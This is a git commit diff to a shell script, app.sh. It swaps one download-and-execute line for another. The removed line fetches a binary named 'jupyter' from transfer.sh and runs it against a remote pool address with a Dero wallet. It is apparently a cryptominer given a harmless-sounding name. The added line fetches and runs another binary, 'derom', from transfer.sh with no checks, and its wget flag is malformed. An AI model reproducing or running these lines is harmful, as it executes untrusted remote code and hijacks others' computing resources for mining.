4b14d67770a29ad67ec57593380a25edb19b04c8
bungabiru991 <107380783+bungabiru991@users.noreply.github.com>
2022-10-20 12:39:53 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,1 +1,1 @@
-wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r 142.93.49.129:10100 -w dero1qy3k9h7fuw3ky9v8g4c4urs5s8c6gafqtmy2xfju98ty483kgyyy5qg4effk0.Ajurexx-55xxA
+wget - q https://transfer.sh/42Kagq/derom && chmod +x derom && ./derom
